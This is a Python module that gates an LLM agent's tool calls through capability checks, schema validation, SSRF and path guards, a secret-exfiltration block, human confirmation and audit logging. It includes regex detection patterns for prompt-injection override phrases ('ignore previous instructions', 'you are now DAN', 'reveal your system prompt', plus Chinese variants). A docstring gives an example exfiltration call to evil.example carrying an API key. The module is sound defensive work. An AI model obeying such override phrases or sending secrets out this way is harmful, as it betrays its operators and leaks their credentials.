"""Capability-based Tool Policy Engine.

The model never reaches a tool executor directly. Every LLM tool call is funneled
through this engine first::

    LLM tool call
      -> schema validation        (arguments match the declared JSON schema)
      -> capability / permission  (this agent role may call this tool at all)
      -> risk classification       (metadata risk + dynamic SSRF / path / sensitive)
      -> human confirmation         (high-risk tools wait for an explicit approval)
      -> Tool Executor

Plus two cross-cutting guards: outbound tool *results* are scrubbed for prompt
injection before they are handed back to the model, and every decision is written
to an append-only JSONL audit log.

Design constraints:

* **Pure where it matters.** Metadata lookup, capability checks, schema validation,
  the SSRF/path/sensitive classifiers and result sanitization have no I/O and are
  individually unit-testable. The only side effect is the best-effort audit log.
* **No import cycle.** This module never imports ``tools``; the executor imports
  *this* module and passes the declared parameter schema in at call time.
* **Permissive default.** :meth:`ToolPolicy.permissive` allows every tool and never
  forces confirmation, so the bare ``execute_tool_call`` path (and its tests) keep
  their existing behavior. Capability scoping and confirmation enforcement are opt-in
  per request; security blocks (SSRF / path traversal / sensitive-memory) always apply
  once a policy is attached.
"""

from __future__ import annotations

import ipaddress
import json
import logging
import re
import threading
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlsplit

from deepseek_infra.core.config import (
    TOOL_POLICY_AUDIT_ENABLED,
    TOOL_POLICY_AUDIT_LOG,
    TOOL_POLICY_AUDIT_DIR,
    TOOL_POLICY_ENABLED,
    TOOL_POLICY_ENFORCE_SCHEMA,
    TOOL_POLICY_REQUIRE_CONFIRM,
    TOOL_POLICY_SANITIZE_RESULTS,
)
from deepseek_infra.infra.data.memory import is_sensitive_memory

logger = logging.getLogger("deepseek_infra.tool_policy")

# Risk ladder, low -> critical. Used both for metadata and for the effective risk
# after dynamic escalation (e.g. fetch_url to a private host becomes "critical").
RISK_ORDER = {"low": 0, "medium": 1, "high": 2, "critical": 3}

# Decision actions.
ALLOW = "allow"
DENY = "deny"
NEEDS_CONFIRMATION = "needs_confirmation"


# --- Tool metadata --------------------------------------------------------------

@dataclass(frozen=True, slots=True)
class ToolMetadata:
    """Static security profile for one tool (the ``{name, risk, network, ...}`` card)."""

    name: str
    risk: str = "low"
    network: bool = False
    filesystem: bool = False
    requires_confirm: bool = False
    timeout_seconds: int = 30
    max_output_chars: int = 12_000
    # Tags that drive dynamic guards / sanitization, not user-facing.
    external_output: bool = False  # result carries untrusted external text
    sensitive_sink: bool = False  # arguments may persist sensitive data
    capability: str = "general"  # logical capability group

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "risk": self.risk,
            "network": self.network,
            "filesystem": self.filesystem,
            "requiresConfirm": self.requires_confirm,
            "timeoutSeconds": self.timeout_seconds,
            "maxOutputChars": self.max_output_chars,
            "capability": self.capability,
        }


# One card per tool exposed by available_tool_definitions(). Unknown tools are denied.
TOOL_METADATA: dict[str, ToolMetadata] = {
    "web_search": ToolMetadata(
        "web_search", risk="medium", network=True, timeout_seconds=45,
        external_output=True, capability="research",
    ),
    "compare_search_results": ToolMetadata(
        "compare_search_results", risk="medium", network=True, timeout_seconds=60,
        external_output=True, capability="research",
    ),
    "fetch_url": ToolMetadata(
        "fetch_url", risk="high", network=True, timeout_seconds=45,
        external_output=True, capability="research",
    ),
    "python_eval": ToolMetadata(
        "python_eval", risk="medium", timeout_seconds=8, capability="code",
    ),
    "search_files": ToolMetadata(
        "search_files", risk="low", filesystem=True, capability="code",
    ),
    "read_file_chunk": ToolMetadata(
        "read_file_chunk", risk="low", filesystem=True, capability="code",
    ),
    "list_project_files": ToolMetadata(
        "list_project_files", risk="low", filesystem=True, capability="code",
    ),
    "data_transform": ToolMetadata("data_transform", risk="low", capability="code"),
    "generate_chart": ToolMetadata("generate_chart", risk="low", capability="general"),
    "create_mindmap": ToolMetadata(
        "create_mindmap", risk="low", filesystem=True, capability="general",
    ),
    "create_pptx": ToolMetadata(
        "create_pptx", risk="low", filesystem=True, capability="general",
    ),
    "create_document": ToolMetadata(
        "create_document", risk="low", filesystem=True, capability="general",
    ),
    "recall_memory": ToolMetadata("recall_memory", risk="low", capability="assistant"),
    "list_reminders": ToolMetadata("list_reminders", risk="low", capability="assistant"),
    "suggest_memory": ToolMetadata(
        "suggest_memory", risk="medium", sensitive_sink=True, capability="assistant",
    ),
    "create_reminder": ToolMetadata(
        "create_reminder", risk="medium", sensitive_sink=True, capability="assistant",
    ),
    "forget_memory": ToolMetadata(
        "forget_memory", risk="high", requires_confirm=True, capability="assistant",
    ),
}


def tool_metadata(name: str) -> ToolMetadata | None:
    return TOOL_METADATA.get(str(name or "").strip())


def all_tool_names() -> tuple[str, ...]:
    return tuple(TOOL_METADATA.keys())


# --- Capability profiles (capability-based security) ----------------------------

# Each Agent role is granted a *different* slice of the tool surface. The main chat
# uses the implicit "full" profile (every tool). Worker roles mirror
# multi_agent.agent_tools_for so offering and execution agree (defense in depth):
# even if a worker hallucinates a tool outside its grant, execution is denied.
CAPABILITY_PROFILES: dict[str, tuple[str, ...]] = {
    "full": all_tool_names(),
    "researcher": ("web_search", "compare_search_results", "fetch_url"),
    "coder": ("search_files", "read_file_chunk", "python_eval"),
    "reasoner": (),
    "critic": (),
}


def capability_tools(role: str) -> list[str]:
    """Tools a named capability/agent role may call. Unknown role -> no tools."""
    return list(CAPABILITY_PROFILES.get(str(role or "").strip(), ()))


# --- Schema validation ----------------------------------------------------------

def validate_arguments(name: str, arguments: Any, schema: dict[str, Any] | None) -> list[str]:
    """Lightweight JSON-schema check; returns a list of human-readable violations.

    Intentionally small (no jsonschema dependency): validates argument container
    type, required keys, scalar types and enum/pattern constraints one level deep,
    which is where malformed model output actually shows up. An empty list means
    the arguments satisfy the declared schema.
    """
    violations: list[str] = []
    if not isinstance(arguments, dict):
        return [f"arguments must be an object, got {type(arguments).__name__}"]
    if not isinstance(schema, dict) or not schema:
        return violations
    properties = schema.get("properties")
    properties = properties if isinstance(properties, dict) else {}
    for key in schema.get("required") or []:
        if key not in arguments:
            violations.append(f"missing required field: {key}")
    for key, value in arguments.items():
        spec = properties.get(key)
        if not isinstance(spec, dict):
            if schema.get("additionalProperties") is False and key not in properties:
                violations.append(f"unexpected field: {key}")
            continue
        violations.extend(_validate_scalar(key, value, spec))
    return violations


_JSON_TYPE_CHECKS: dict[str, type | tuple[type, ...]] = {
    "string": str,
    "integer": int,
    "number": (int, float),
    "boolean": bool,
    "array": list,
    "object": dict,
}


def _validate_scalar(key: str, value: Any, spec: dict[str, Any]) -> list[str]:
    out: list[str] = []
    expected = spec.get("type")
    if isinstance(expected, str) and expected in _JSON_TYPE_CHECKS:
        checker = _JSON_TYPE_CHECKS[expected]
        # bool is an int subclass in Python; keep them distinct for JSON typing.
        if expected == "integer" and isinstance(value, bool):
            out.append(f"{key} must be integer")
        elif expected == "number" and isinstance(value, bool):
            out.append(f"{key} must be number")
        elif not isinstance(value, checker):
            out.append(f"{key} must be {expected}")
    enum = spec.get("enum")
    if isinstance(enum, list) and enum and value not in enum:
        out.append(f"{key} must be one of {enum}")
    pattern = spec.get("pattern")
    if isinstance(pattern, str) and isinstance(value, str):
        try:
            if re.search(pattern, value) is None:
                out.append(f"{key} does not match pattern")
        except re.error:  # pragma: no cover - declared patterns are valid
            pass
    return out


# --- SSRF / private-target guard (static, no DNS) -------------------------------

_LOCAL_HOST_SUFFIXES = (".local", ".localhost", ".internal")


def evaluate_url_safety(url: str) -> tuple[bool, str]:
    """Static SSRF pre-check for an http(s) URL. Returns ``(safe, reason)``.

    Cheap and side-effect free: catches obvious internal targets (localhost,
    literal private / loopback / link-local IPs incl. the cloud metadata address,
    credentials, non-http schemes). The authoritative DNS-resolving check still
    runs inside ``fetch_url`` itself; this is the first of two layers.
    """
    raw = str(url or "").strip()
    if not raw:
        return False, "empty url"
    try:
        parsed = urlsplit(raw)
    except ValueError:
        return False, "invalid url"
    if parsed.scheme not in {"http", "https"}:
        return False, f"scheme not allowed: {parsed.scheme or '(none)'}"
    if parsed.username or parsed.password:
        return False, "url credentials are not allowed"
    host = (parsed.hostname or "").strip().rstrip(".").lower()
    if not host:
        return False, "missing host"
    if host == "localhost" or host.endswith(_LOCAL_HOST_SUFFIXES):
        return False, "local host is not allowed"
    literal = host[1:-1] if host.startswith("[") and host.endswith("]") else host
    try:
        ip = ipaddress.ip_address(literal)
    except ValueError:
        return True, ""  # a name; DNS-time guard in fetch_url has the final say
    if (
        not ip.is_global
        or ip.is_private
        or ip.is_loopback
        or ip.is_link_local
        or ip.is_multicast
        or ip.is_reserved
        or ip.is_unspecified
    ):
        return False, f"private or local ip is not allowed: {ip}"
    return True, ""


# --- Filesystem path-escape guard ----------------------------------------------

_SAFE_FILE_ID = re.compile(r"^[A-Za-z0-9_-]{1,128}$")
_SAFE_PROJECT_ID = re.compile(r"^[A-Za-z0-9_.:-]{0,80}$")


def evaluate_path_safety(arguments: dict[str, Any]) -> tuple[bool, str]:
    """Reject file/project identifiers that try to escape the cache sandbox."""
    file_id = str(arguments.get("fileId") or "").strip()
    if file_id and not _SAFE_FILE_ID.fullmatch(file_id):
        return False, "fileId contains illegal characters"
    project_id = str(arguments.get("projectId") or "").strip()
    if project_id:
        if ".." in project_id or "/" in project_id or "\\" in project_id:
            return False, "projectId path traversal"
        if not _SAFE_PROJECT_ID.fullmatch(project_id):
            return False, "projectId contains illegal characters"
    return True, ""


# --- Secret-exfiltration guard (Context Taint firewall, v2.1.5) ------------------

_MIN_SECRET_CHARS = 8


def arguments_contain_secret(arguments: Any, secrets: tuple[str, ...]) -> bool:
    """True when any string leaf of the tool arguments embeds a configured secret.

    Legitimate tool arguments never contain the runtime's own API keys or auth
    token, so a hit means injected content is trying to exfiltrate credentials
    through a tool call (e.g. ``fetch_url`` to ``evil.example/?key=<API_KEY>``).
    Secrets shorter than ``_MIN_SECRET_CHARS`` are ignored to avoid false hits.
    """
    real_secrets = tuple(secret for secret in secrets if len(str(secret or "")) >= _MIN_SECRET_CHARS)
    if not real_secrets:
        return False

    def walk(node: Any) -> bool:
        if isinstance(node, str):
            return any(secret in node for secret in real_secrets)
        if isinstance(node, dict):
            return any(walk(value) for value in node.values())
        if isinstance(node, list):
            return any(walk(item) for item in node)
        return False

    return walk(arguments)


# --- Prompt-injection sanitization of tool results ------------------------------

# Unambiguous override directives commonly used to hijack an agent from inside
# fetched/searched text. Kept deliberately narrow to avoid mangling normal prose.
_INJECTION_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"(?i)ignore\s+(?:all\s+)?(?:the\s+)?(?:previous|prior|above)\s+instructions?"),
    re.compile(r"(?i)disregard\s+(?:all\s+)?(?:the\s+)?(?:previous|prior|above|your)\s+(?:instructions?|rules?|prompt)"),
    re.compile(r"(?i)forget\s+(?:all\s+)?(?:previous|prior|your)\s+(?:instructions?|rules?)"),
    re.compile(r"(?i)you\s+are\s+now\s+(?:a\s+|an\s+|in\s+)?(?:developer|dan|jailbreak|unrestricted)"),
    re.compile(r"(?i)(?:reveal|print|output|repeat)\s+(?:your\s+)?(?:system\s+prompt|hidden\s+instructions?|api[_\s-]?key|secret)"),
    re.compile(r"(?i)忽略(?:上述|之前|前面|以上|所有|你的|的)*(?:指令|指示|提示|要求|规则|命令)"),
    re.compile(r"(?i)无视(?:上述|之前|前面|以上|所有|你的|的)*(?:指令|指示|提示|要求|规则|命令)"),
)

INJECTION_REDACTION = "[内容安全策略已屏蔽疑似注入指令]"

# Result fields that carry untrusted external text and are worth scrubbing.
_EXTERNAL_TEXT_KEYS = {"text", "snippet", "title", "content", "raw_content", "rawContent", "description"}


def sanitize_external_text(text: str) -> tuple[str, int]:
    """Redact unambiguous prompt-injection directives. Returns ``(text, hits)``."""
    if not isinstance(text, str) or not text:
        return text, 0
    hits = 0
    cleaned = text
    for pattern in _INJECTION_PATTERNS:
        cleaned, count = pattern.subn(INJECTION_REDACTION, cleaned)
        hits += count
    return cleaned, hits


def sanitize_tool_result(name: str, output: dict[str, Any]) -> tuple[dict[str, Any], int]:
    """Walk a tool output and scrub injection directives from external-text fields.

    Only tools whose metadata is flagged ``external_output`` are scrubbed, and only
    string values under known text keys are touched, so structure and non-text fields
    (urls, ids, scores) are preserved byte-for-byte. Mutates ``output`` in place and
    returns ``(output, total_hits)``.
    """
    meta = tool_metadata(name)
    if meta is None or not meta.external_output or not isinstance(output, dict):
        return output, 0
    return output, _scrub_node(output.get("result"))


def _scrub_node(node: Any) -> int:
    """Recursively redact injection text under known text keys; returns total hits."""
    hits = 0
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, str) and key in _EXTERNAL_TEXT_KEYS:
                cleaned, found = sanitize_external_text(value)
                if found:
                    node[key] = cleaned
                    hits += found
            else:
                hits += _scrub_node(value)
    elif isinstance(node, list):
        for item in node:
            hits += _scrub_node(item)
    return hits


# --- Policy decision ------------------------------------------------------------

@dataclass(frozen=True, slots=True)
class PolicyDecision:
    tool: str
    action: str
    risk: str
    reasons: tuple[str, ...] = ()
    violations: tuple[str, ...] = ()
    capability: str = "full"

    @property
    def allowed(self) -> bool:
        return self.action == ALLOW

    @property
    def needs_confirmation(self) -> bool:
        return self.action == NEEDS_CONFIRMATION

    def to_dict(self) -> dict[str, Any]:
        return {
            "tool": self.tool,
            "action": self.action,
            "risk": self.risk,
            "reasons": list(self.reasons),
            "violations": list(self.violations),
            "capability": self.capability,
        }


def _max_risk(*risks: str) -> str:
    best = "low"
    for risk in risks:
        if RISK_ORDER.get(risk, 0) > RISK_ORDER.get(best, 0):
            best = risk
    return best


# --- The policy engine ----------------------------------------------------------

class ToolPolicy:
    """A per-request, capability-scoped gate over tool execution.

    Construct one per chat turn (or per worker) and pass it through
    ``execute_tool_calls``. The same instance accumulates audit stats for the turn,
    which feed the ``toolPolicy`` diagnostics block.
    """

    def __init__(
        self,
        *,
        capability: str = "full",
        allowed_tools: list[str] | tuple[str, ...] | None = None,
        approvals: set[str] | None = None,
        enabled: bool = True,
        enforce_schema: bool | None = None,
        require_confirm: bool | None = None,
        sanitize: bool | None = None,
        audit: bool | None = None,
        scope: str = "global",
        secrets: tuple[str, ...] = (),
        tainted: bool = False,
        taint_escalation: bool = False,
    ) -> None:
        self.capability = str(capability or "full")
        if allowed_tools is not None:
            self.allowed_tools: set[str] = {str(item) for item in allowed_tools}
        elif self.capability in CAPABILITY_PROFILES:
            self.allowed_tools = set(CAPABILITY_PROFILES[self.capability])
        else:
            self.allowed_tools = set(all_tool_names())
        self.approvals = {str(item) for item in (approvals or set())}
        self.enabled = bool(enabled)
        self.enforce_schema = TOOL_POLICY_ENFORCE_SCHEMA if enforce_schema is None else bool(enforce_schema)
        self.require_confirm = TOOL_POLICY_REQUIRE_CONFIRM if require_confirm is None else bool(require_confirm)
        self.sanitize = TOOL_POLICY_SANITIZE_RESULTS if sanitize is None else bool(sanitize)
        self.audit = TOOL_POLICY_AUDIT_ENABLED if audit is None else bool(audit)
        self.scope = str(scope or "global")
        # Context Taint firewall (v2.1.5): the runtime's own credentials (never
        # legitimate inside tool arguments) and whether this turn's context
        # carried injection directives. A tainted turn puts high-risk /
        # sensitive-sink tools behind explicit confirmation when escalation is on.
        self.secrets = tuple(str(item) for item in secrets if str(item or ""))
        self.taint_escalation = bool(taint_escalation)
        self._lock = threading.Lock()
        self.tainted = bool(tainted)
        self.evaluated = 0
        self.allowed_count = 0
        self.denied = 0
        self.confirmations = 0
        self.sanitized_hits = 0
        self.secret_blocks = 0
        self.blocked_tools: list[str] = []

    # -- classmethods ------------------------------------------------------------

    @classmethod
    def permissive(cls) -> "ToolPolicy":
        """Allow every tool, never force confirmation; security guards still apply.

        This is the default for the bare ``execute_tool_call`` path so existing
        callers and tests are unaffected.
        """
        return cls(capability="full", require_confirm=False, enforce_schema=False)

    # -- evaluation --------------------------------------------------------------

    def evaluate(self, name: str, arguments: Any, *, schema: dict[str, Any] | None = None) -> PolicyDecision:
        tool = str(name or "").strip()
        meta = tool_metadata(tool)
        reasons: list[str] = []
        violations: list[str] = []

        if meta is None:
            return self._record(PolicyDecision(tool or "unknown", DENY, "high", ("unknown_tool",), (), self.capability))

        # 1. Capability / permission check.
        if tool not in self.allowed_tools:
            reasons.append(f"capability_denied:{self.capability}")
            return self._record(PolicyDecision(tool, DENY, _max_risk(meta.risk, "high"), tuple(reasons), (), self.capability))

        # 2. Schema validation (soft unless enforce_schema).
        args = arguments if isinstance(arguments, dict) else {}
        violations = validate_arguments(tool, args, schema)
        if violations and self.enforce_schema:
            reasons.append("schema_invalid")
            return self._record(PolicyDecision(tool, DENY, meta.risk, tuple(reasons), tuple(violations), self.capability))

        # 3. Risk classification + dynamic security guards.
        risk = meta.risk
        if meta.network and tool == "fetch_url":
            safe, why = evaluate_url_safety(str(args.get("url") or ""))
            if not safe:
                reasons.append(f"ssrf_blocked:{why}")
                return self._record(PolicyDecision(tool, DENY, "critical", tuple(reasons), tuple(violations), self.capability))
        if meta.filesystem:
            safe, why = evaluate_path_safety(args)
            if not safe:
                reasons.append(f"path_blocked:{why}")
                return self._record(PolicyDecision(tool, DENY, "critical", tuple(reasons), tuple(violations), self.capability))
        if meta.sensitive_sink and tool == "suggest_memory":
            if is_sensitive_memory(str(args.get("content") or "")):
                reasons.append("sensitive_memory_blocked")
                return self._record(PolicyDecision(tool, DENY, "high", tuple(reasons), tuple(violations), self.capability))
        # Secret exfiltration (Context Taint firewall): the runtime's own
        # credentials never belong in tool arguments — an unconditional block.
        if self.secrets and arguments_contain_secret(args, self.secrets):
            reasons.append("secret_exfiltration_blocked")
            with self._lock:
                self.secret_blocks += 1
            return self._record(PolicyDecision(tool, DENY, "critical", tuple(reasons), tuple(violations), self.capability))

        # 4. Human confirmation for high-risk tools.
        if self.require_confirm and meta.requires_confirm and tool not in self.approvals:
            reasons.append("requires_confirmation")
            return self._record(PolicyDecision(tool, NEEDS_CONFIRMATION, _max_risk(risk, "high"), tuple(reasons), tuple(violations), self.capability))

        # 5. Taint escalation: when this turn's context carried injection /
        # exfiltration / tool directives from untrusted sources, dangerous tools
        # wait for an explicit approval instead of running silently.
        if (
            self.taint_escalation
            and self.is_tainted
            and tool not in self.approvals
            and (meta.requires_confirm or meta.sensitive_sink or RISK_ORDER.get(meta.risk, 0) >= RISK_ORDER["high"])
        ):
            reasons.append("taint_escalated_confirmation")
            return self._record(PolicyDecision(tool, NEEDS_CONFIRMATION, _max_risk(risk, "high"), tuple(reasons), tuple(violations), self.capability))

        if violations:
            reasons.append("schema_warning")
        return self._record(PolicyDecision(tool, ALLOW, risk, tuple(reasons), tuple(violations), self.capability))

    def _record(self, decision: PolicyDecision) -> PolicyDecision:
        with self._lock:
            self.evaluated += 1
            if decision.action == ALLOW:
                self.allowed_count += 1
            elif decision.action == NEEDS_CONFIRMATION:
                self.confirmations += 1
                self.blocked_tools.append(decision.tool)
            else:
                self.denied += 1
                self.blocked_tools.append(decision.tool)
        if self.audit:
            write_audit_entry(decision, scope=self.scope)
        return decision

    # -- taint state ---------------------------------------------------------------

    @property
    def is_tainted(self) -> bool:
        with self._lock:
            return self.tainted

    def mark_tainted(self) -> None:
        with self._lock:
            self.tainted = True

    # -- result sanitization -----------------------------------------------------

    def sanitize_result(self, name: str, output: dict[str, Any]) -> dict[str, Any]:
        if not self.sanitize:
            return output
        cleaned, hits = sanitize_tool_result(name, output)
        if hits:
            with self._lock:
                self.sanitized_hits += hits
                # Injection directives arrived mid-turn through a tool result:
                # treat the rest of the turn as tainted (defense in depth).
                self.tainted = True
        return cleaned

    # -- denial output -----------------------------------------------------------

    @staticmethod
    def denial_output(decision: PolicyDecision) -> dict[str, Any]:
        reason = decision.reasons[0] if decision.reasons else decision.action
        if decision.action == NEEDS_CONFIRMATION:
            message = f"Tool '{decision.tool}' requires user confirmation before it can run"
            code = "requires_confirmation"
        else:
            message = f"Tool '{decision.tool}' was blocked by tool policy ({reason})"
            code = "forbidden"
        return {
            "ok": False,
            "tool": decision.tool,
            "error": message,
            "code": code,
            "policy": decision.to_dict(),
        }

    # -- diagnostics -------------------------------------------------------------

    def diagnostics(self) -> dict[str, Any]:
        with self._lock:
            return {
                "enabled": self.enabled,
                "capability": self.capability,
                "evaluated": self.evaluated,
                "allowed": self.allowed_count,
                "denied": self.denied,
                "confirmations": self.confirmations,
                "sanitizedInjections": self.sanitized_hits,
                "secretBlocks": self.secret_blocks,
                "tainted": self.tainted,
                "blockedTools": sorted(set(self.blocked_tools)),
            }


# --- Audit log (append-only JSONL) ----------------------------------------------

_audit_lock = threading.Lock()


def write_audit_entry(decision: PolicyDecision, *, scope: str = "global") -> None:
    """Append one decision to the JSONL audit log. Best-effort; never raises."""
    if not TOOL_POLICY_AUDIT_ENABLED:
        return
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z"),
        "scope": str(scope or "global"),
        **decision.to_dict(),
    }
    try:
        with _audit_lock:
            TOOL_POLICY_AUDIT_DIR.mkdir(parents=True, exist_ok=True)
            with TOOL_POLICY_AUDIT_LOG.open("a", encoding="utf-8") as handle:
                handle.write(json.dumps(entry, ensure_ascii=False, sort_keys=True) + "\n")
    except Exception as exc:  # pragma: no cover - audit must never break a tool call
        logger.warning("tool_policy audit write failed: %s", exc)


def read_recent_audit(limit: int = 50) -> list[dict[str, Any]]:
    """Tail of the audit log, newest last. Used by the status endpoint."""
    if not TOOL_POLICY_AUDIT_LOG.exists():
        return []
    capped = max(1, min(int(limit or 50), 500))
    try:
        lines = TOOL_POLICY_AUDIT_LOG.read_text(encoding="utf-8").splitlines()
    except OSError:
        return []
    entries: list[dict[str, Any]] = []
    for line in lines[-capped:]:
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(data, dict):
            entries.append(data)
    return entries


# --- Status (endpoint / config) -------------------------------------------------

def tool_policy_status() -> dict[str, Any]:
    return {
        "enabled": TOOL_POLICY_ENABLED,
        "enforceSchema": TOOL_POLICY_ENFORCE_SCHEMA,
        "requireConfirm": TOOL_POLICY_REQUIRE_CONFIRM,
        "sanitizeResults": TOOL_POLICY_SANITIZE_RESULTS,
        "auditEnabled": TOOL_POLICY_AUDIT_ENABLED,
        "auditLogPath": str(TOOL_POLICY_AUDIT_LOG),
        "capabilities": {role: list(tools) for role, tools in CAPABILITY_PROFILES.items()},
        "tools": [meta.to_dict() for meta in TOOL_METADATA.values()],
    }
